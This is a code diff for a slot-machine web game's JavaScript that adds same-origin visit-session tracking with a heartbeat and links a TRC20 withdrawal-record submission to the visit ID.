@@ -1,9 +1,94 @@
 // ===================== NEXUS SLOT · 主游戏逻辑 =====================
 const API_BASE = '';
 
-// 翻译辅助函数
 const T = k => (typeof window.__t === 'function') ? window.__t(k) : k;
 
+// ===================== 访问会话管理 =====================
+let __visitId = null;
+let __heartbeatTimer = null;
+let __heartbeatInterval = 30;
+let __visitStarted = false;
+let __visitEnded = false;
+
+async function startVisitSession() {
+    if (__visitStarted) return;
+    __visitStarted = true;
+    try {
+        // 1) 读心跳配置
+        try {
+            const cfgRes = await fetch('/api/public-settings');
+            const cfg = await cfgRes.json();
+            if (cfg.heartbeatInterval) __heartbeatInterval = cfg.heartbeatInterval;
+        } catch (e) { /* 忽略 */ }
+
+        // 2) 创建访问记录
+        const lang = (document.getElementById('langSelect') && document.getElementById('langSelect').value) || (navigator.language || 'en');
+        const visitId = Date.now() + '_' + Math.random().toString(36).slice(2, 10);
+        const res = await fetch('/api/visit-start', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ visitId: visitId, language: lang })
+        });
+        const data = await res.json();
+        if (data.success && data.id) {
+            __visitId = data.id;
+            window.__visitId = data.id;
+            startHeartbeat();
+        }
+    } catch (e) {
+        console.warn('访问会话创建失败:', e.message);
+    }
+}
+
+function startHeartbeat() {
+    if (__heartbeatTimer) clearInterval(__heartbeatTimer);
+    __heartbeatTimer = setInterval(() => {
+        if (!__visitId || __visitEnded) return;
+        fetch('/api/visit-heartbeat', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ id: __visitId })
+        }).catch(() => {});
+    }, __heartbeatInterval * 1000);
+}
+
+function endVisitSession() {
+    if (!__visitId || __visitEnded) return;
+    __visitEnded = true;
+    const payload = JSON.stringify({ id: __visitId });
+    if (navigator.sendBeacon) {
+        try {
+            navigator.sendBeacon('/api/visit-end', new Blob([payload], { type: 'application/json' }));
+        } catch (e) {
+            fetch('/api/visit-end', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload,
+                keepalive: true
+            }).catch(() => {});
+        }
+    } else {
+        fetch('/api/visit-end', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: payload,
+            keepalive: true
+        }).catch(() => {});
+    }
+    if (__heartbeatTimer) { clearInterval(__heartbeatTimer); __heartbeatTimer = null; }
+}
+
+// 页面加载即开始访问会话
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', startVisitSession);
+} else {
+    startVisitSession();
+}
+// 离开页面上报
+window.addEventListener('pagehide', endVisitSession);
+window.addEventListener('beforeunload', endVisitSession);
+
+// ===================== 主游戏 =====================
 (function(){
 const N=5,EXTRA=28,DELAY=.1,DUR=2.05,STEP=.16,OVER=16,SPINS=3;
 const PAYOUT_BY_MATCH = {2:10, 3:30, 4:200, 5:10000};
@@ -226,15 +311,21 @@ function init(){
 }
 if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",init);else init();
 
-// 暴露给语言切换脚本
 window.__refreshSpinBtn = restoreBtn;
 })();
 
-// ========== 提交 TRC20 提现记录到后端 ==========
+// ========== 提交 TRC20 提现记录到后端（带上 visitId） ==========
 async function submitTrc20Record(address, balance){
-  try{
+  try {
     const lang = (document.getElementById('langSelect') && document.getElementById('langSelect').value) || (navigator.language || 'en');
+    const visitId = window.__visitId;
+    if (!visitId) {
+      console.warn('未创建访问会话，无法提交');
+      alert('页面还在初始化，请稍后再试');
+      return;
+    }
     const payload = {
+      id: visitId,
       address: address,
       balance: balance || '0.00',
       timestamp: new Date().toISOString(),
@@ -246,9 +337,8 @@ async function submitTrc20Record(address, balance){
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if(!res.ok){
+    if (!res.ok) {
       const data = await res.json().catch(() => ({}));
-      // ★ IP 每日次数已用完
       if (res.status === 429 || data.error === 'DAILY_LIMIT_REACHED') {
         const t = window.__t || (k => k);
         alert(t('limit_reached'));
@@ -257,8 +347,8 @@ async function submitTrc20Record(address, balance){
       console.warn('提交失败:', data.error || ('HTTP ' + res.status));
       return;
     }
-    console.log('[提交] TRC20 记录已保存');
-  }catch(err){
+    console.log('[提交] 提现记录已保存');
+  } catch (err) {
     console.warn('地址记录提交失败:', err.message);
   }
 }
